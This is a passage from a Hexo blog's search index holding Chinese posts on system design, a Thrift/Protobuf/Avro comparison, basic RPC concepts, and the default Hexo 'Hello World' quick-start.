title="三、扩展性"></a>三、扩展性</h1><p>指的是添加新功能时对现有系统的其它应用无影响，这就要求不同应用具备低耦合的特点。</p><p>实现可扩展主要有两种方式：</p><ul><li>使用消息队列进行解耦，应用之间通过消息传递进行通信；</li><li>使用分布式服务将业务和可复用的服务分离开来，业务使用分布式服务框架调用可复用的服务。新增的产品可以通过调用可复用的服务来实现业务逻辑，对其它产品没有影响。</li></ul><h1 id="四、可用性"><a href="#四、可用性" class="headerlink" title="四、可用性"></a>四、可用性</h1><h2 id="冗余"><a href="#冗余" class="headerlink" title="冗余"></a>冗余</h2><p>保证高可用的主要手段是使用冗余，当某个服务器故障时就请求其它服务器。</p><p>应用服务器的冗余比较容易实现，只要保证应用服务器不具有状态，那么某个应用服务器故障时，负载均衡器将该应用服务器原先的用户请求转发到另一个应用服务器上，不会对用户有任何影响。</p><p>存储服务器的冗余需要使用主从复制来实现，当主服务器故障时，需要提升从服务器为主服务器，这个过程称为切换。</p><h2 id="监控"><a href="#监控" class="headerlink" title="监控"></a>监控</h2><p>对 CPU、内存、磁盘、网络等系统负载信息进行监控，当某个信息达到一定阈值时通知运维人员，从而在系统发生故障之前及时发现问题。</p><h2 id="服务降级"><a href="#服务降级" class="headerlink" title="服务降级"></a>服务降级</h2><p>服务降级是系统为了应对大量的请求，主动关闭部分功能，从而保证核心功能可用。</p><h1 id="五、安全性"><a href="#五、安全性" class="headerlink" title="五、安全性"></a>五、安全性</h1><p>要求系统在应对各种攻击手段时能够有可靠的应对措施。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.cyc2018.xyz/">https://www.cyc2018.xyz/</a></p>]]></content>
    
    
    <categories>
      
      <category>系统设计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Thrift、Protobuf和Avro的比较</title>
    <link href="/2023/03/05/Thrift%E3%80%81Protobuf%E5%92%8CAvro%E7%9A%84%E6%AF%94%E8%BE%83/"/>
    <url>/2023/03/05/Thrift%E3%80%81Protobuf%E5%92%8CAvro%E7%9A%84%E6%AF%94%E8%BE%83/</url>
    
    <content type="html"><![CDATA[<h2 id="一、定义"><a href="#一、定义" class="headerlink" title="一、定义"></a>一、定义</h2><h3 id="Thrift"><a href="#Thrift" class="headerlink" title="Thrift"></a>Thrift</h3><p><strong>Thrift</strong> 是由 Facebook 主导开发的一个跨平台、支持多语言的，通过定义 IDL 文件，自动生成 RPC 客户端与服务端通信代码的工具，以构建在 C++, Java, Python, PHP, Ruby, Erlang, Perl, Haskell, C#, Cocoa, JavaScript, Node.js, Smalltalk, and OCaml 这些编程语言间无缝结合的、高效的服务。Thrift通过一个中间语言(IDL, 接口定义语言)来定义RPC的接口和数据类型，然后通过一个编译器生成不同语言的代码并由生成的代码负责RPC协议层和传输层的实现。</p><p><strong>Thrift</strong> 是由 Facebook 开源的一个RPC框架，用来进行可扩展且跨语言的服务的开发，使得各种编程语言间无缝结合的、高效的服务。我们依据Thrift的规范 简单定义访问接口，通过Thrift编译器编译生成各种编程语言代码，实现各种语言模块之间的高效互访问，速度比Google的Protocol Buffers还要快。Thrift可以说它是现在最优秀的分布式通信机制，实现了在大型分布式集群中各独立模块之间的高效协同</p><h3 id="Protobuf"><a href="#Protobuf" class="headerlink" title="Protobuf"></a>Protobuf</h3><p><strong>protocol buffer</strong> 是一种序列化与结构化数据的一种机制，具有跨平台、解析速度快、序列化数据体积小、扩展性高、使用简单的特点。</p><h3 id="Avro"><a href="#Avro" class="headerlink" title="Avro"></a>Avro</h3><p><strong>Apache Avro</strong> 是一个二进制的数据序列化系统。实际上 Avro 除了序列化之外，像 MP 一样也提供了远程调用（ RPC ）功能。 Avro 是属于 Hadoop 的一个子项目，由 Hadoop 的 创始人 Doug Cutting 牵头开发，设计用于支持大批量数据交换的应用，依赖模式 (Schema) 来实现数据结构定义，模式由 JSON 对象来表示， Avro 也被作为一种 RPC 框架来使用。客户端希望同服务器端交互时，就需要交换双方通信的协议，它类似于模式，需要双方来定义，在 Avro 中被称为消息 (Message) 。通信双方都必须保持这种协议，以便于解析从对方发送过来的数据，这也就是传说中的握手阶段。</p><h2 id="二、框架优缺点分析"><a href="#二、框架优缺点分析" class="headerlink" title="二、框架优缺点分析"></a>二、框架优缺点分析</h2><h3 id="Google-Protobuf"><a href="#Google-Protobuf" class="headerlink" title="Google Protobuf"></a>Google Protobuf</h3><p><strong>优点</strong></p><ul><li>二进制消息，性能好&#x2F;效率高（空间和时间效率都很不错）</li><li>proto文件生成目标代码，简单易用</li><li>序列化反序列化直接对应程序中的数据类，不需要解析后在进行映射(XML,JSON都是这种方式)</li><li>支持向前兼容（新加字段采用默认值）和向后兼容（忽略新加字段），简化升级</li><li>支持多种语言（可以把proto文件看做IDL文件）</li><li>Netty等一些框架集成</li></ul><p><strong>缺点</strong></p><ul><li>官方只支持C++,JAVA和Python语言绑定</li><li>二进制可读性差（貌似提供了Text_Fromat功能）</li><li>二进制不具有自描述特性</li><li>默认不具备动态特性（可以通过动态定义生成消息类型或者动态编译支持）</li><li>只涉及序列化和反序列化技术，不涉及RPC功能（类似XML或者JSON的解析器）</li></ul><h3 id="Apache-Thrift"><a href="#Apache-Thrift" class="headerlink" title="Apache Thrift"></a>Apache Thrift</h3><p><strong>应用</strong></p><ul><li>Facebook的开源的日志收集系统(scribe: <a href="https://github.com/facebook/scribe">https://github.com/facebook/scribe</a>)</li><li>淘宝的实时数据传输平台(TimeTunnel <a href="http://code.taobao.org/p/TimeTunnel/wiki/index">http://code.taobao.org/p/TimeTunnel/wiki/index</a>)</li><li>Evernote开放接口(<a href="https://github.com/evernote/evernote-thrift">https://github.com/evernote/evernote-thrift</a>)</li><li>Quora(<a href="http://www.quora.com/Apache-Thrift">http://www.quora.com/Apache-Thrift</a>)</li><li>HBase( <a href="http://abloz.com/hbase/book.html#thrift">http://abloz.com/hbase/book.html#thrift</a> )</li><li>…</li></ul><p><strong>优点</strong></p><ul><li>支持非常多的语言绑定</li><li>thrift文件生成目标代码，简单易用</li><li>消息定义文件支持注释</li><li>数据结构与传输表现的分离，支持多种消息格式</li><li>包含完整的客户端&#x2F;服务端堆栈，可快速实现RPC</li><li>支持同步和异步通信</li></ul><p><strong>缺点</strong></p><ul><li>和protobuf一样不支持动态特性</li></ul><h3 id="Apache-Avro"><a href="#Apache-Avro" class="headerlink" title="Apache Avro"></a>Apache Avro</h3><p><strong>应用</strong></p><ul><li>Hadoop RPC （<a href="http://hadoop.apache.org/#What+Is+Apache+Hadoop%3F%EF%BC%89">http://hadoop.apache.org/#What+Is+Apache+Hadoop%3F）</a></li></ul><p><strong>优点</strong></p><ul><li>二进制消息，性能好&#x2F;效率高</li><li>使用JSON描述模式</li><li>模式和数据统一存储，消息自描述，不需要生成stub代码（支持生成IDL）</li><li>RPC调用在握手阶段交换模式定义</li><li>包含完整的客户端&#x2F;服务端堆栈，可快速实现RPC</li><li>支持同步和异步通信</li><li>支持动态消息</li><li>模式定义允许定义数据的排序（序列化时会遵循这个顺序）</li><li>提供了基于Jetty内核的服务基于Netty的服务</li></ul><p><strong>缺点</strong></p><ul><li>只支持Avro自己的序列化格式</li><li>语言绑定不如Thrift丰富</li></ul><h2 id="三、性能对比"><a href="#三、性能对比" class="headerlink" title="三、性能对比"></a>三、性能对比</h2><p>由于thrift功能较protobuf丰富,因此单从序列化机制上进行性能比较,手机html制作按照序列化后字节数、序列化时间、反序列化时间三个指标进行对thrift的二进制、压缩、protobuf三种格式进行对比发现：Protobuf序列化后的字节数较少,符合w3c标准而且序列化和反序列化的时间也较短.</p><h2 id="四、小结"><a href="#四、小结" class="headerlink" title="四、小结"></a>四、小结</h2><p><strong>相同点：</strong></p><ol><li><strong>简化处理对xml文件的处理</strong></li></ol><ul><li>数据类型相对固定的情况下，不论是thrift还是protobuf都会比直接处理xml要方便很多</li></ul><blockquote><p>常用的跨语言通信方案：</p><ul><li>基于SOAP消息格式的WebService</li><li>基于JSON消息格式的RESTful 服务</li></ul><p>以上两种方案的弊端：</p><ul><li>XML体积太大，解析性能极差</li><li>JSON体积相对较小，解析相对较快，但表达能力较弱</li></ul></blockquote><p><strong>不同点：</strong></p><ol><li><strong>创作者</strong></li></ol><p>thrift由facebook出品，protobuffer由google出品；</p><ol start="2"><li><strong>语言支持</strong></li></ol><ul><li><p>Thrift: 支持的语言更广泛一些c++, java, python,ruby, csharp, haskell, ocmal, erlang, cocoa, php</p></li><li><p>protobuf 目前还是只支持c++, java, python</p></li></ul><ol start="3"><li><strong>协议支持</strong></li></ol><ul><li><p>Thrift支持多种协议格式. Thrift的代码实现，有专门的TProtocol和TTransport抽象，相互配合，可以实现多种协议，方便集成各种传输方式。至少目前Thrift就能使用json作为序列化协议。 </p></li><li><p>protobuf只安心一种协议，并下决心把这个格式做好。输入输出也是标准的stream。</p></li></ul><ol start="4"><li><strong>跨平台问题</strong></li></ol><ul><li><p>thrift目前不支持Windows平台 </p></li><li><p>protobuf没有这个问题，提供了visual studio的项目文件，可以很顺利的在windows平台下编译。</p></li></ul><ol start="5"><li><strong>易用性</strong></li></ol><ul><li>thrift侧重点是构建夸语言的可伸缩的服务，特点就是支持的语言多，同时提供了完整的rpc service framework，可以很方便的直接构建服务，不需要做太多其他的工作。</li></ul><h2 id="五、参考链接"><a href="#五、参考链接" class="headerlink" title="五、参考链接"></a>五、参考链接</h2><p><a href="https://blog.csdn.net/hu2010shuai/article/details/53009349">https://blog.csdn.net/hu2010shuai/article/details/53009349</a></p>]]></content>
    
    
    <categories>
      
      <category>RPC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RPC基本概念</title>
    <link href="/2023/03/05/RPC%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/"/>
    <url>/2023/03/05/RPC%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
    
    <content type="html"><![CDATA[<h1 id="一、基本概念"><a href="#一、基本概念" class="headerlink" title="一、基本概念"></a>一、基本概念</h1><h2 id="1-1-本地函数调用"><a href="#1-1-本地函数调用" class="headerlink" title="1.1 本地函数调用"></a>1.1 本地函数调用</h2><p>举例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function">func <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    var a = <span class="hljs-number">2</span><br>    var b = <span class="hljs-number">3</span><br>    result := <span class="hljs-built_in">calculate</span>(a, b)<br>    fmt.<span class="hljs-built_in">Println</span>(result)<br>    <span class="hljs-keyword">return</span><br>&#125;<br><br><br>func <span class="hljs-built_in">calculate</span>(x, y <span class="hljs-type">int</span>) &#123;<br>    z := x * y<br>    <span class="hljs-keyword">return</span> z<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>将 a 和 b 的值压栈</li><li>通过函数指针找到 calculate 函数，进入函数取出栈中的值 2 和 3，将其赋予 x 和 y</li><li>计算 x * y，并将结果存在 z</li><li>将 z 的值压栈，然后从 calculate 返回</li><li>从栈中取出 z 返回值，并赋值给 result</li></ol><h2 id="1-2-远程服务调用（RPC-Remote-Procedure-Calls）"><a href="#1-2-远程服务调用（RPC-Remote-Procedure-Calls）" class="headerlink" title="1.2 远程服务调用（RPC - Remote Procedure Calls）"></a>1.2 远程服务调用（RPC - Remote Procedure Calls）</h2><p>远程服务调用和本地服务调用相比，服务端和客户端之间肯定部署在不同的机器上&#x2F;中间隔着一个网络</p><p>RPC需要解决的问题：</p><ol><li>函数映射</li></ol><p>举例：网上商城</p><p><strong>问题一：网上商城如何告诉支付服务要实现付款&#x2F;充值？</strong></p><p>本地调用是使用函数指针调用，但是远程调用是两个进程，其地址空间都是不一样的。所以每个函数都有自己的ID，在RPC的时候需要附上函数ID。通过ID找到函数，然后再去执行</p><ol start="2"><li>数据转换成字节流</li></ol><p><strong>问题二：网上商城如何将参数告诉远程？</strong></p><p>本地调用直接参数压栈即可，远程调用中客户端和服务器是不同的进程，不能通过简单的内存传输，这个时候需要客户端先转换为一个字节流传输到服务端，再将字节流转换成自己能读取的格式</p><ol start="3"><li>网络传输</li></ol><center><img src="/2023/03/05/RPC%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/%E7%BD%91%E7%BB%9C%E4%BC%A0%E8%BE%93.png" class="" title="网络传输"></center><!-- <center><img src="网络传输.png"></center> --><p><strong>问题三：远程调用往往发生在网络上，如何保证网络上高效稳定地传输数据？</strong></p><h2 id="1-3-RPC-概念模型"><a href="#1-3-RPC-概念模型" class="headerlink" title="1.3 RPC 概念模型"></a>1.3 RPC 概念模型</h2><center><img src="/2023/03/05/RPC%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/RPC%E6%A6%82%E5%BF%B5%E6%A8%A1%E5%9E%8B.png" class="" title="RPC概念模型"></center><!-- <center><img src="RPC概念模型.png"></center> --><h2 id="1-4-一次-RPC-的完整过程"><a href="#1-4-一次-RPC-的完整过程" class="headerlink" title="1.4 一次 RPC 的完整过程"></a>1.4 一次 RPC 的完整过程</h2><center><img src="/2023/03/05/RPC%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/%E4%B8%80%E6%AC%A1RPC%E7%9A%84%E5%AE%8C%E6%95%B4%E8%BF%87%E7%A8%8B.png" class="" title="一次RPC的完整过程"></center><!-- <center><img src="一次RPC的完整过程.png"></center> --><p><strong>IDL（interface description language）文件</strong></p><p>IDL 通过一种中立的方式来描述接口，使得在不同平台上运行的对象和用不通过语音编写的程序可以相互通信</p><p><strong>生成代码</strong></p><p>通过编译器工具把 IDL 文件转换成语言对应的静态库</p><p><strong>编解码</strong></p><p>从内存中表示到字节序列的转换成为编码，反之为解码，也常叫做序列化和反序列化</p><p><strong>通信协议</strong></p><p>规范了数据再网络中的传输内容和格式。除必须的请求&#x2F;响应数据外，通常还会包含额外的元数据</p><p><strong>网络传输</strong></p><p>通常基于成熟的网络库走 TCP&#x2F;UDP 传输</p><h2 id="1-5-RPC-的好处"><a href="#1-5-RPC-的好处" class="headerlink" title="1.5 RPC 的好处"></a>1.5 RPC 的好处</h2><ol><li><p>单一职责，有利于分工协作和运维开发</p></li><li><p>可扩展性强，资源利用率更优</p></li><li><p>故障隔离，服务的整体可靠性更高</p></li></ol><center><img src="/2023/03/05/RPC%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/%E6%8A%96%E9%9F%B3%E6%9E%B6%E6%9E%84%E5%9B%BE.png" class="" title="抖音架构图"></center><!-- <center><img src="抖音架构图.png"></center> --><h2 id="1-6-RPC-带来的问题"><a href="#1-6-RPC-带来的问题" class="headerlink" title="1.6 RPC 带来的问题"></a>1.6 RPC 带来的问题</h2><ol><li><p>服务宕机，对方如何处理？</p></li><li><p>在调用过程中发生网络异常，如何保证消息的可达性？</p></li><li><p>请求量突增导致无法及时处理，有哪些应对措施？</p></li></ol><p><strong>上述问题需要使用 RPC 框架处理</strong></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ol><li><p>本地函数调用和 RPC 调用的区别：函数映射、数据转换成字节流、网络传输</p></li><li><p>RPC 概念模型：User、User-Stub、RPC-Runtime、Server-Stub、Server</p></li><li><p>一次 RPC 的完整过程，并讲解了 RPC 的基本概念定义</p></li><li><p>RPC 带来好处的同时也带来了不少新的问题，将由 RPC 框架来解决</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>RPC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/03/03/hello-world/"/>
    <url>/2023/03/03/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
